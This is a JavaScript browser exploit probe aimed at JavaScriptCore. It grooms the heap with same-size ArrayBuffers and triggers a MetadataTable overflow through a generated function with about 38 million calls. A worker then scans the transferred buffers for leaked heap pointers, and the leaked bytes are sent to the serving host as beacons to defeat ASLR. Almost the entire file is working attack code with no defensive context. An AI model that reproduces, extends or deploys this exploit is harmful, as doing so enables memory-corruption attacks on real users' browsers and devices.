// p174 — MetadataTable overflow: same-page bait/runway ArrayBuffers
//
// WHY PREVIOUS PROBES CRASH: The metadata buffer and the zero runway
// are in DIFFERENT marge pages. The sweep hits unmapped gaps between them.
//
// FIX: Allocate ALL objects as ArrayBuffers of the SAME SIZE (100KB).
// Baits and runway come from the same bmalloc size class, so they're
// in the SAME marge pages. When we free the baits, the metadata buffer
// fills a freed slot IN THE SAME PAGE as the live runway ABs.
//
// The sweep then reads zeros from adjacent ABs (safe) and WRITES
// real metadata entries (with JSC pointers) that the worker can read.
//
// ValueProfile at entry offset 88 contains the callee JSValue = heap pointer.
// This gives us an ASLR leak.
//
// Beacon prefix: V174-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var queue = [];
  var sending = false;

  function B(tag) {
    queue.push(tag);
    if (!sending) drain();
  }

  function drain() {
    if (queue.length === 0) { sending = false; return; }
    sending = true;
    var tag = queue.shift();
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V174-' + tag + '?t=' + Date.now(), true);
      x.onloadend = function() { setTimeout(drain, 15); };
      x.onerror = function() { setTimeout(drain, 15); };
      x.send();
    } catch(e) { setTimeout(drain, 15); }
  }

  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  var attempt = 0;
  try {
    attempt = parseInt(localStorage.getItem('p174_att') || '0');
    localStorage.setItem('p174_att', '' + (attempt + 1));
  } catch(e) {}

  B('BOOT-A' + attempt);

  // ── Allocate ALL ArrayBuffers at once (same size class = same pages) ──
  var AB_SIZE = 102400; // 100KB — matches metadata buffer size class
  var N_BAIT = 20;
  var N_RUNWAY = 180;
  var N_TOTAL = N_BAIT + N_RUNWAY; // 200 total

  var allABs = [];
  try {
    for (var i = 0; i < N_TOTAL; i++) {
      allABs.push(new ArrayBuffer(AB_SIZE));
    }
  } catch(e) {
    B('OOM-' + allABs.length);
  }
  B('ALLOC-' + allABs.length);

  // Split: first N_BAIT are baits, rest are runway
  var baitABs = allABs.slice(0, N_BAIT);
  var runwayABs = allABs.slice(N_BAIT);
  allABs = null;

  // ── Worker ──
  var workerCode = function() {
    var views = [];
    var baseUrl = '';
    var STRIDE = 112;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V174-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'buffers') {
        var abs = e.data.abs;
        for (var i = 0; i < abs.length; i++) {
          views.push(new Uint8Array(abs[i]));
        }
        beacon('BUFS-' + views.length);
        self.postMessage({ bufsReady: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCH');
        var found = false;
        var iters = 0;

        while (!found) {
          // Check ArrayBuffer views for non-zero bytes at metadata stride
          for (var bi = 0; bi < views.length; bi++) {
            var v = views[bi];
            // Check at several metadata-aligned offsets
            for (var off = 0; off < v.length; off += STRIDE * 10) {
              if (v[off] !== 0 || v[off+8] !== 0 || v[off+88] !== 0) {
                beacon('HIT-b' + bi + '-o' + off);

                // Dump first 112 bytes of the entry
                var entry = '';
                for (var eb = 0; eb < STRIDE && (off+eb) < v.length; eb++) {
                  entry += hx(v[off+eb]);
                }
                beacon('E-' + entry.substring(0, 200));
                beacon('E2-' + entry.substring(200));

                // Extract 8-byte values at key offsets
                // offset 88: ValueProfile.m_buckets[0] = callee JSValue
                // offset 96: ValueProfile.m_buckets[1]
                // offset 68: m_bytecodeIndex
                var offsets = [0, 8, 16, 24, 32, 40, 48, 56, 64, 68, 72, 80, 88, 96, 104];
                for (var oi = 0; oi < offsets.length; oi++) {
                  var po = offsets[oi];
                  if (off + po + 8 > v.length) continue;
                  var bytes = '';
                  for (var pb = 7; pb >= 0; pb--) {
                    bytes += hx(v[off + po + pb]);
                  }
                  if (bytes !== '0000000000000000') {
                    beacon('V-' + po + '-' + bytes);
                  }
                }

                found = true;
                break;
              }
            }
            if (found) break;
          }

          iters++;
          if (iters % 2000000 === 0) beacon('P-' + iters);
          if (iters > 200000000) { beacon('GIVEUP'); return; }
        }

        if (!found) return;

        // Full scan: count hits and dump more entries
        var hitBufs = 0;
        var hitEntries = 0;
        for (var bi = 0; bi < views.length; bi++) {
          var v = views[bi];
          var bufHits = 0;
          for (var off = 0; off < v.length; off += STRIDE) {
            if (v[off] !== 0 || v[off+8] !== 0 || v[off+88] !== 0) {
              bufHits++;
              if (hitEntries < 3) {
                // Dump ValueProfile (offset 88, 24 bytes) — the pointer
                var vp = '';
                for (var vb = 0; vb < 24 && (off+88+vb) < v.length; vb++) {
                  vp += hx(v[off+88+vb]);
                }
                beacon('VP-' + bi + '-' + off + '-' + vp);
              }
              hitEntries++;
            }
          }
          if (bufHits > 0) {
            hitBufs++;
            beacon('BUF' + bi + '-' + bufHits + 'hits');
          }
        }
        beacon('TOTAL-' + hitBufs + 'bufs-' + hitEntries + 'entries');
        beacon('DONE');
      }
    };
  };

  var watchBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var watcher = new Worker(URL.createObjectURL(watchBlob));
  watcher.postMessage({ cmd: 'init', baseUrl: BASE });

  // Transfer runway ABs to worker
  var transferList = [];
  for (var i = 0; i < runwayABs.length; i++) transferList.push(runwayABs[i]);
  watcher.postMessage({ cmd: 'buffers', abs: runwayABs }, transferList);
  runwayABs = null;

  watcher.onmessage = function(e) {
    if (e.data.bufsReady) {
      B('XFER-OK');
      doFreeAndBuild();
    }
  };

  function doFreeAndBuild() {
    // Free bait ArrayBuffers — their backing stores stay in the same marge pages
    for (var i = 0; i < baitABs.length; i++) baitABs[i] = null;
    baitABs = null;
    B('BAIT-FREE');

    // GC to free the bait backing stores
    var gc = 0;
    function gcRound() {
      for (var j = 0; j < 2000; j++) new ArrayBuffer(4096);
      for (var j = 0; j < 500; j++) new Array(50).fill(gc);
      gc++;
      if (gc < 40) setTimeout(gcRound, 20);
      else { B('GC-OK'); doBuild(); }
    }
    gcRound();
  }

  function doBuild() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v174=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v174ok=1;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1048576 | 0) + 'M');
    callChunk = null; remChunk = null; parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMP-' + (window.__v174ok ? 'OK' : 'NO'));
      if (!window.__v174) { B('NOFN'); return; }

      watcher.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALL');
        try {
          window.__v174(function(){});
        } catch(ex) {
          B('EX-' + (ex.message || '').substring(0, 20));
        }
        B('ALIVE');
      }, 200);
    };

    sc.onerror = function() { B('SERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
